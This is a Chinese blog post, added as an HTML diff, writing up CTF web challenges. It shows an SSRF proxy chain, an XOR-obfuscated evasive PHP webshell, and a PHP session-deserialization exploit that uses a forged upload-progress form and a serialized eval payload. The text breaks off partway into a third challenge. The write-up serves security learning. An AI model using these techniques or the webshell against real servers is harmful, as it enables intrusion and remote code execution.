@@ -1,0 +1,1567 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.2">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.2" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.2',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="前言 CTF玩的越多发现自己越来越菜，很多脑洞和知识面不够 因此本系列文章将记录那些从中得到很大收获与感悟的CTF web题">
+<meta name="keywords" content="CTF,web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF Web记录(二)">
+<meta property="og:url" content="https://songxpu.github.io/2019/09/28/CTF Web记录(二)/index.html">
+<meta property="og:site_name" content="Pines404">
+<meta property="og:description" content="前言 CTF玩的越多发现自己越来越菜，很多脑洞和知识面不够 因此本系列文章将记录那些从中得到很大收获与感悟的CTF web题">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/28/CTF%20Web记录(二)/web1_1.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/28/CTF%20Web记录(二)/web1_3.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/28/CTF%20Web记录(二)/web1_2.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/28/CTF%20Web记录(二)/web1_4.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/28/CTF%20Web记录(二)/web1_5.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/28/CTF%20Web记录(二)/web1_6.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/28/CTF%20Web记录(二)/web1_7.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/28/CTF%20Web记录(二)/web1_8.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/28/CTF%20Web记录(二)/web1_9.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/28/CTF%20Web记录(二)/web1_10.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/28/CTF%20Web记录(二)/web2_1.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/28/CTF%20Web记录(二)/web2_2.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/28/CTF%20Web记录(二)/web2_3.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/28/CTF%20Web记录(二)/web2_4.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/28/CTF%20Web记录(二)/web2_5.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/28/CTF%20Web记录(二)/web3_1.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/28/CTF%20Web记录(二)/web3_2.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/28/CTF%20Web记录(二)/web3_3.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/28/CTF%20Web记录(二)/web3_4.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/28/CTF%20Web记录(二)/web4_1.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/28/CTF%20Web记录(二)/web4_3.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/28/CTF%20Web记录(二)/web5_1.jpg">
+<meta property="og:image" content="https://songxpu.github.io/2019/09/28/CTF%20Web记录(二)/web5_2.jpg">
+<meta property="og:updated_time" content="2019-09-28T14:03:26.242Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CTF Web记录(二)">
+<meta name="twitter:description" content="前言 CTF玩的越多发现自己越来越菜，很多脑洞和知识面不够 因此本系列文章将记录那些从中得到很大收获与感悟的CTF web题">
+<meta name="twitter:image" content="https://songxpu.github.io/2019/09/28/CTF%20Web记录(二)/web1_1.jpg">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="https://songxpu.github.io/2019/09/28/CTF Web记录(二)/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>CTF Web记录(二) | Pines404</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Pines404</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">穷究于理，成就于工</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签<span class="badge">11</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类<span class="badge">3</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档<span class="badge">15</span></a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://songxpu.github.io/2019/09/28/CTF Web记录(二)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Azeroth">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pines404">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CTF Web记录(二)
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-09-28 22:02:49 / 修改时间：22:03:26" itemprop="dateCreated datePublished" datetime="2019-09-28T22:02:49+08:00">2019-09-28</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">14k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">13 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>CTF玩的越多发现自己越来越菜，很多脑洞和知识面不够</p>
+<p>因此本系列文章将记录那些从中得到很大收获与感悟的CTF web题</p>
+</blockquote>
+<a id="more"></a>
+
+<h2 id="Chopper"><a href="#Chopper" class="headerlink" title="Chopper"></a>Chopper</h2><blockquote>
+<p>题目来源：ISCC2016    </p>
+</blockquote>
+<p>第二个坎是proxy.php?url=xxxx</p>
+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>访问首页</p>
+<img src="//songxpu.github.io/2019/09/28/CTF Web记录(二)/web1_1.jpg" width="500">
+
+<p>点击管理员登录提示不是管理员</p>
+<img src="//songxpu.github.io/2019/09/28/CTF Web记录(二)/web1_3.jpg" width="400">
+
+<p>抓包尝试修改XXF、Client-Ip等字段未成功</p>
+<p>于是查看主页源码以及/admin/目录源码</p>
+<img src="//songxpu.github.io/2019/09/28/CTF Web记录(二)/web1_2.jpg" width="700">
+
+<img src="//songxpu.github.io/2019/09/28/CTF Web记录(二)/web1_4.jpg" width="550">
+
+<p>得到信息：</p>
+<ul>
+<li>proxy.php?url=xxxxxxx</li>
+<li>admin ip is 202.5.19.128</li>
+</ul>
+<p>此处猜测proxy.php是否存在SSRF</p>
+<p>访问<code>http://web.jarvisoj.com:32782/proxy.php?url=http://web.jarvisoj.com:32782/admin/</code>，仍然提示不是admin</p>
+<p>尝试访问<code>http://web.jarvisoj.com:32782/proxy.php?url=202.5.19.128</code>，发现网页发生跳转</p>
+<img src="//songxpu.github.io/2019/09/28/CTF Web记录(二)/web1_5.jpg" width="550">
+
+<p>同时发现<code>202.5.19.128/proxy.php</code>存在</p>
+<img src="//songxpu.github.io/2019/09/28/CTF Web记录(二)/web1_6.jpg" width="550">
+
+<p>那么到这里就非常清晰了，先跳转到202.5.19.128/proxy.php，再次跳转admin目录下</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32782</span><span class="regexp">/proxy.php?url=202.5.19.128/</span>proxy.php?url=http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32782</span><span class="regexp">/admin/</span></span><br></pre></td></tr></table></figure>
+
+<img src="//songxpu.github.io/2019/09/28/CTF Web记录(二)/web1_7.jpg" width="550">
+
+<p>发现admin目录下存在robots.txt</p>
+<img src="//songxpu.github.io/2019/09/28/CTF Web记录(二)/web1_8.jpg" width>
+
+<p>得到<code>trojan.php</code>的源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $&#123;(<span class="string">"#"</span>^<span class="string">"|"</span>).(<span class="string">"#"</span>^<span class="string">"|"</span>)&#125;=(<span class="string">"!"</span>^<span class="string">"`"</span>).(<span class="string">"( "</span>^<span class="string">"&#123;"</span>).(<span class="string">"("</span>^<span class="string">"["</span>).(<span class="string">"~"</span>^<span class="string">";"</span>).(<span class="string">"|"</span>^<span class="string">"."</span>).(<span class="string">"*"</span>^<span class="string">"~"</span>);$&#123;(<span class="string">"#"</span>^<span class="string">"|"</span>).(<span class="string">"#"</span>^<span class="string">"|"</span>)&#125;((<span class="string">"-"</span>^<span class="string">"H"</span>). (<span class="string">"]"</span>^<span class="string">"+"</span>). (<span class="string">"["</span>^<span class="string">":"</span>). (<span class="string">","</span>^<span class="string">"@"</span>). (<span class="string">"&#125;"</span>^<span class="string">"U"</span>). (<span class="string">"e"</span>^<span class="string">"A"</span>). (<span class="string">"("</span>^<span class="string">"w"</span>).(<span class="string">"j"</span>^<span class="string">":"</span>). (<span class="string">"i"</span>^<span class="string">"&amp;"</span>). (<span class="string">"#"</span>^<span class="string">"p"</span>). (<span class="string">"&gt;"</span>^<span class="string">"j"</span>). (<span class="string">"!"</span>^<span class="string">"z"</span>). (<span class="string">"T"</span>^<span class="string">"g"</span>). (<span class="string">"e"</span>^<span class="string">"S"</span>). (<span class="string">"_"</span>^<span class="string">"o"</span>). (<span class="string">"?"</span>^<span class="string">"b"</span>). (<span class="string">"]"</span>^<span class="string">"t"</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>显然是经过免杀的webshell，这里可以通过php直接运行</p>
+<img src="//songxpu.github.io/2019/09/28/CTF Web记录(二)/web1_9.jpg" width>
+
+<p>成功获得flag</p>
+<img src="//songxpu.github.io/2019/09/28/CTF Web记录(二)/web1_10.jpg" width>
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这道题峰回路转，有点考脑洞。</p>
+<p>被几个难点拦住：</p>
+<ul>
+<li>访问admin目录提示is not admin，想着通过更改数据包来绕过，但不奏效</li>
+<li>proxy.php?url=xxx这里算是存在SSRF，可以通过它去访问百度等网站，但通过它访问admin目录失败</li>
+<li>没有想到202.5.19.128/proxy.php的存在</li>
+</ul>
+<p>回过头来看，这道题将202.5.19.128作为一个代理服务器，先跳转到这中间代理服务器上，再通过代理服务器去访问仅admin能访问的/admin/</p>
+<p>同时查看免杀的PHP文件内容可以在命令行中直接运行，查看其报错信息；PHP7.2无法复现，可能对版本存在要求</p>
+<h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><blockquote>
+<p>题目来源：Jarvis OJ    考察：PHP session反序列化漏洞</p>
+</blockquote>
+<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>访问主页获得源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果忽视第一行代码，这道题将没有任何利用点，因为$mdzz不可控。</p>
+<p>但第一行也提示<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code>，本文件session序列化处理器为<code>php</code>;</p>
+<p>同时访问phpinfo发现session处理器局部变量为<code>php</code>，全局变量为<code>php_serialize</code></p>
+<img src="//songxpu.github.io/2019/09/28/CTF Web记录(二)/web2_1.jpg" width="800">
+
+<blockquote>
+<p><code>session.save_path</code> 设置session的存储路径</p>
+<p><code>session.save_handler</code> 设定用户自定义存储函数</p>
+<p><code>session.auto_start</code> 指定会话模块是否在请求开始时启动一个会话</p>
+<p><code>session.serialize_handler</code> 定义用来序列化/反序列化的处理器名字。</p>
+</blockquote>
+<hr>
+<p><strong>php session反序列化漏洞</strong></p>
+<p>PHP session实际上是以文件形式存在的，文件名格式为<code>sess_sessionid</code>，文件内容为<code>session序列化后的值</code></p>
+<p><strong>demo</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#demo1 php_serialize ==&gt; a:1:&#123;s:4:"name";s:4:"test";&#125;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">'session.serialize_handler'</span>,<span class="string">'php_serialize'</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[<span class="string">'name'</span>] = <span class="string">'twosmi1e'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#demo2 php ==&gt; name|s:4:"test";</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'name'</span>] = <span class="string">'spoock'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#demo3 php_binary ==&gt; *names:4:"test";  //*为session name的长度4,对应于ascii(4),无法显示</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_binary'</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'name'</span>] = <span class="string">'spoock'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。</p>
+<p><strong>例如：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">'name'</span>] = <span class="string">'|O:11:"PeopleClass":0:&#123;&#125;'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>上述数据使用的处理器为php_serialize，那么存储后的内容为<code>a:1:{s:6:&quot;spoock&quot;;s:24:&quot;|O:11:&quot;PeopleClass&quot;:0:{}&quot;;}</code></p>
+<p>但在页面读取session时，使用的反序列化处理器为php时，则读取的内容为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span> (size=<span class="number">1</span>)</span><br><span class="line">  <span class="string">'a:1:&#123;s:6:"spoock";s:24:"'</span> =&gt; </span><br><span class="line">    object(__PHP_Incomplete_Class)[<span class="number">1</span>]</span><br><span class="line">      <span class="keyword">public</span> <span class="string">'__PHP_Incomplete_Class_Name'</span> =&gt; string <span class="string">'PeopleClass'</span> (length=<span class="number">11</span>)</span><br></pre></td></tr></table></figure>
+
+<p>因为当使用php引擎的时候，php引擎会以<strong>|</strong>作为作为key和value的分隔符，那么就会将<code>a:1:{s:6:&quot;spoock&quot;;s:24:&quot;</code>作为SESSION的key，将<code>O:11:&quot;PeopleClass&quot;:0:{}</code>作为value，然后进行反序列化，最后就会得到PeopleClas这个类。</p>
+<p>这种由于序列话化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。</p>
+<hr>
+<p>但现在问题是如何向session写文件，这里存在一个漏洞，由phpinfo可知，<code>session.upload_progress.enabled为On。</code></p>
+<img src="//songxpu.github.io/2019/09/28/CTF Web记录(二)/web2_2.jpg" width="800">
+
+<p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。</p>
+<p>那么利用这个漏洞，构造一个文件上传</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造序列化payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz=<span class="string">'print_r(dirname(__FILE__));'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> OowoO();</span><br><span class="line">var_dump(serialize($obj));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//string(62) "O:5:"OowoO":1:&#123;s:4:"mdzz";s:27:"print_r(dirname(__FILE__));";&#125;"</span></span><br></pre></td></tr></table></figure>
+
+<img src="//songxpu.github.io/2019/09/28/CTF Web记录(二)/web2_3.jpg" width="800">
+
+<img src="//songxpu.github.io/2019/09/28/CTF Web记录(二)/web2_4.jpg" width="800">
+
+<img src="//songxpu.github.io/2019/09/28/CTF Web记录(二)/web2_5.jpg" width="800">
+
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>在看PHP序列化文章中提到了session序列化漏洞，收获很大，这个知识点也恰好是知识盲区</p>
+<p><strong>文章参考</strong>：</p>
+<ul>
+<li><p><a href="https://xz.aliyun.com/t/3674" target="_blank" rel="noopener">PHP反序列化由浅入深</a></p>
+</li>
+<li><p><a href="https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/#PHPINFO" target="_blank" rel="noopener">jarvisoj-web-writeup</a></p>
+</li>
+<li><p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/" target="_blank" rel="noopener">PHP中SESSION反序列化机制</a></p>
+</li>
+</ul>
+<h2 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h2><blockquote>
+<p>题目来源：LCTF 2018    考察：SSRF、php session反序列化、CRLF攻击</p>
+</blockquote>
+<h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p>进入首页得到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">'implode'</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">'f'</span>], $_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>])) &#123;</span><br><span class="line">    $_SESSION[<span class="string">'name'</span>] = $_GET[<span class="string">'name'</span>];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b, $a);</span><br></pre></td></tr></table></figure>
+
+<p>同时发现flag.php</p>
